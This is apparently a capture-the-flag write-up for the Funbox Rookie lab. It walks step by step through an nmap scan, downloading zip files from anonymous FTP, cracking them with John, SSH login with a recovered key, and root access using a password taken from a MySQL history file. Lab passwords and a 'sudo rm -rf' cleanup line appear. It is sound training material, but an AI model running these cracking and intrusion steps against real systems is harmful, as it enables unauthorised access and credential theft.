# Funbox Rookie
## Enumeration
Lets start with doing a network scan of the IP address to identify possible assets (NOTE: This might take up quite some time)
```code
nmap -sV -sC -A -p- 192.168.54.107 -vv
```
In the output of the ```NMAP``` command, we realise that Port 21 is running on FTP and login is allowed.
```code
PORT      STATE    SERVICE REASON      VERSION
21/tcp    open     ftp     syn-ack     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
```
## Exploit
Now we know that the service running running on port 21 is FTP, we will visit the FTP server in our browser and download all the ZIP files.\
![image](https://user-images.githubusercontent.com/42378287/128554707-c95e2405-e5f0-4345-8b9b-03831450da2d.png)

Upon downloading the ZIP files, we realize that the ZIP files are all password-protected, and we will have to try to crack the password files using John.\
To do so, I have written a simple script to first convert the ZIP files into hashes, before running the hash against John. 
```code
zip2john anna.zip > anna.txt
zip2john ariel.zip > ariel.txt
zip2john bud.zip > bud.txt
zip2john cathrine.zip > catherine.txt
zip2john homer.zip > homer.txt
zip2john jessica.zip > jessica.txt
zip2john john.zip > john.txt
zip2john marge.zip > marge.txt
zip2john miriam.zip > miriam.txt
zip2john zlatan.zip > zlatan.txt
zip2john tom.zip > tom.txt
sudo rm -rf anna.zip ariel.zip bud.zip cathrine.zip homer.zip jessica.zip john.zip marge.zip miriam.zip zlatan.zip tom.zip
john --wordlist=/home/kali/Desktop/rockyou.txt anna.txt
john --wordlist=/home/kali/Desktop/rockyou.txt ariel.txt
john --wordlist=/home/kali/Desktop/rockyou.txt bud.txt
john --wordlist=/home/kali/Desktop/rockyou.txt catherine.txt
john --wordlist=/home/kali/Desktop/rockyou.txt homer.txt
john --wordlist=/home/kali/Desktop/rockyou.txt jessica.txt
john --wordlist=/home/kali/Desktop/rockyou.txt john.txt
john --wordlist=/home/kali/Desktop/rockyou.txt marge.txt
john --wordlist=/home/kali/Desktop/rockyou.txt miriam.txt
john --wordlist=/home/kali/Desktop/rockyou.txt zlatan.txt
john --wordlist=/home/kali/Desktop/rockyou.txt tom.txt
john --show anna.txt
john --show ariel.txt
john --show bud.txt
john --show catherine.txt
john --show homer.txt
john --show jessica.txt
john --show john.txt
john --show marge.txt
john --show miriam.txt
john --show tom.txt
john --show zlatan.txt
```
From the output of the script, we realize that only ```tom.zip``` could be cracked and the password is ```iuubire```. Unzipping ```tom.zip``` file reveals a PEM RSA private key file that could be used to SSH into a private server.
```code
ssh -i id_rsa tom@192.168.54.107
```
In the home directory of the server that we manage to SSH into, we discover a ```.mysql_history``` file that contains the password (```xx11yy22!```) to the user
```code
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```
With the password, we can execute ```sudo su``` command to obtain root privileges. In the root directory, there are 2 files ```flag.txt``` and ```proof.txt```. Our flag can be found in the ```proof.txt``` file. 
